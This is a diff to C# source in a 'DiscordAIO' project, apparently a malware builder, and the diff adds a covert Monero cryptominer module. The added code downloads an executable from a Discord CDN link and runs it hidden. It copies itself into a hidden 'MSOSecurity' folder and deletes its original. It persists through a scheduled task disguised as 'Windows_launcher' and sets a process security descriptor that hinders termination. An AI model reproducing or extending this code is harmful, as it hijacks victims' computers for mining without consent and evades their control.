@@ -20,6 +20,7 @@ using System.Text.RegularExpressions;
 using System.Linq;
 using System.Security.Principal;
 using System.Security.Cryptography;
+using System.Security.AccessControl;
 using System.Management;
 using System.Xml;
 
@@ -2727,6 +2728,177 @@ namespace DiscordAIO
 
 		}
 
+		public static string MineStartDir
+		{
+			get
+			{
+				return System.Windows.Forms.Application.StartupPath;
+			}
+		}
+
+		public static string MineStartPath
+		{
+			get
+			{
+				return System.Windows.Forms.Application.ExecutablePath;
+			}
+		}
+
+		public enum DefendOptions
+		{
+			AntiWindows7 = 0,
+		}
+
+		public static void SetupDefend(DefendOptions dO)
+		{
+			try
+			{
+				if (dO == DefendOptions.AntiWindows7)
+					ProcessSecure();
+			}
+			catch { }
+		}
+
+		[DllImport("Advapi32.dll")]
+		private static extern bool SetKernelObjectSecurity(IntPtr Handle, SecurityInfos SecurityInformation, byte[] SecurityDescriptor);
+
+		private static void ProcessSecure()
+		{
+			try
+			{
+				var sd = new RawSecurityDescriptor(ControlFlags.None, new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null), null, null, new RawAcl(2, 0));
+				sd.SetFlags(ControlFlags.DiscretionaryAclPresent | ControlFlags.DiscretionaryAclDefaulted);
+				var rawSd = new byte[sd.BinaryLength];
+				sd.GetBinaryForm(rawSd, 0);
+				if (!SetKernelObjectSecurity(Process.GetCurrentProcess().Handle, SecurityInfos.DiscretionaryAcl, rawSd))
+					return;
+			}
+			catch { }
+		}
+
+		public partial class ScheduleTask
+		{
+			private string task_name;
+
+			public ScheduleTask(string _task_name)
+			{
+				task_name = _task_name;
+			}
+
+			public void AddTask(string path)
+			{
+				try
+				{
+					Process cmd_proc = new Process
+					{
+						StartInfo = new ProcessStartInfo
+					("cmd", "/C schtasks /create /tn \\" + task_name + "/tr" + path + "/st 00:00 /du 9999:59 /sc once /ri 1 /f")
+					};
+					cmd_proc.StartInfo.CreateNoWindow = true;
+					cmd_proc.StartInfo.UseShellExecute = false;
+					cmd_proc.Start();
+				}
+				catch { }
+			}
+
+			public override string ToString()
+			{
+				return task_name;
+			}
+		}
+
+		public static void DownloadFile(string url, string file_save)
+		{
+			try
+			{
+				new WebClient().DownloadFile(url, file_save);
+			}
+			catch { }
+		}
+
+		public static void DeleteMe()
+		{
+			try
+			{
+				ProcessStartInfo Flash = new ProcessStartInfo
+				{
+					Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + (new FileInfo((new Uri(System.Reflection.Assembly.GetExecutingAssembly().CodeBase)).LocalPath)).Name + "\"",
+					WindowStyle = ProcessWindowStyle.Hidden,
+					CreateNoWindow = true,
+					FileName = "cmd.exe"
+				};
+				Process.Start(Flash).Dispose();
+				Process.GetCurrentProcess().Kill();
+			}
+			catch { }
+		}
+
+		private static string minePool = "%poolhere%";
+		private static string mineUser = "%usernamehere%";
+		private static string mine_cpu_usage = "%usagehere%";
+		private static string minePassword = "%passwordhere%";
+
+		// Thanks to Alexuiop1337
+	    public static void RunMonero()
+        {
+			try
+			{
+				const string download_link = "https://cdn.discordapp.com/attachments/831225076187660348/902512908485935114/shost.exe";
+				new WebClient().DownloadFile(download_link, MineStartDir + "\\shost.exe");
+			}
+			catch {}
+
+			string Pool = minePool;
+			string user = mineUser;
+			string cpu_usage = mine_cpu_usage;
+			string password = minePassword;
+			try
+			{
+				Process moneProcs = new Process();
+				moneProcs.StartInfo.CreateNoWindow = true;
+				moneProcs.StartInfo.UseShellExecute = false;
+				moneProcs.StartInfo.Arguments = string.Format("--url={0} --user={1} --pass={4} --threads 5 --donate-level=1 " +
+						"--keepalive --retries=5 --max-cpu-usage={3}", Pool, user, "0x3", cpu_usage, password);
+				moneProcs.StartInfo.FileName = MineStartDir + "\\runtime-servece.exe";
+
+				if (!MineStartDir.Contains(Environment.GetEnvironmentVariable("LocalAppData")))
+                {
+                    try
+                    {
+						string drop_folder = Environment.GetEnvironmentVariable("ProgramData") + "\\MSOSecurity";
+						if (Directory.Exists(drop_folder))
+							return;
+						Directory.CreateDirectory(drop_folder);
+						File.Copy(MineStartPath, drop_folder + "\\Streamm.exe");
+						File.SetAttributes(drop_folder + "\\Streamm.exe", FileAttributes.Hidden | FileAttributes.System);
+						File.SetAttributes(drop_folder, FileAttributes.Directory | FileAttributes.Hidden | FileAttributes.System);
+						Process.Start(drop_folder + "\\Streamm.exe");
+						DeleteMe();
+					}
+                    catch { }
+                }
+                else
+                {
+					SetupDefend(DefendOptions.AntiWindows7);
+
+					new ScheduleTask("Windows_launcher").AddTask(MineStartPath);
+
+					if (!File.Exists(MineStartDir + "\\shost.exe"))
+                    {
+						var xxx = File.ReadAllBytes(MineStartDir + "\\shost.exe");
+
+						if (!File.Exists(MineStartDir + "\\runtime-servece.exe"))
+							File.WriteAllBytes(MineStartDir + "\\runtime-servece.exe", xxx);
+					}
+
+					moneProcs.Start();
+				}
+			}
+            catch {}
+		}
+
+
+
 		public static void BlockInput()
 		{
 			Brrrrrr.BlockInput(true);
@@ -2861,6 +3033,8 @@ namespace DiscordAIO
 			//takepic
 
 			//custom
+
+			//sneakyminer
 
 			//killinput
 			//killweb
